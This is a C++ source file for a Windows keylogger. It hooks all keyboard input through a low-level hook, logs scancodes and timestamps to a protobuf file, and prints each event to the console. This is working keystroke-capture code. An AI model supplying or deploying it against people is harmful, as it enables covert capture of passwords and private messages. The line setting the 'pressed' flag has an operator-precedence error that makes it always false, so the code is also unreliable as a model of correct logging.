#include <windows.h>
#include <WinUser.h>

#include "keylogger/keylog.pb.h"

#include <iostream>
#include <fstream>

#include <chrono>
#include <format>

namespace {
std::ofstream logfile;
}

LRESULT CALLBACK LowLevelKeyboardProc(int code, WPARAM wparm, LPARAM lparm) {

    auto hook = reinterpret_cast<PKBDLLHOOKSTRUCT>(lparm);
    using std::chrono::duration_cast;
    using std::chrono::hours;
    using std::chrono::milliseconds;
    using std::chrono::minutes;
    using std::chrono::seconds;
    using namespace std::chrono_literals;
    auto ms = milliseconds{hook->time};
    auto timestamp
        = std::format("{} {} {} {}", duration_cast<hours>(ms), duration_cast<minutes>(ms % 1h),
                      duration_cast<seconds>(ms % 1min), ms % 1s);

    keylog::proto::KeyLog keylog;
    auto*                 evt = keylog.add_keyevents();
    evt->set_pressed(!hook->flags & LLKHF_UP);
    evt->set_scancode(hook->scanCode);
    evt->set_timestamp(hook->time);

    keylog.SerializeToOstream(&logfile);
    logfile.flush();

    std::cout << timestamp << "\t" << (hook->flags & LLKHF_UP ? '^' : 'v') << ' ' << hook->scanCode
              << '\t' << hook->vkCode << std::endl;

    return CallNextHookEx(nullptr, code, wparm, lparm);
}

int main(int argc, char* argv[]) {
    if (argc < 2)
        throw std::runtime_error("Usage: " + std::string(argv[0]) + " <filename>");

    logfile.open(argv[1], std::ios::out | std::ios::trunc | std::ios::binary);

    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, nullptr, 0);
    // pump windows events
    MSG msg;
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    std::cout << "leaving" << std::endl;
    UnhookWindowsHookEx(hhkLowLevelKybd);

    return 0;
}
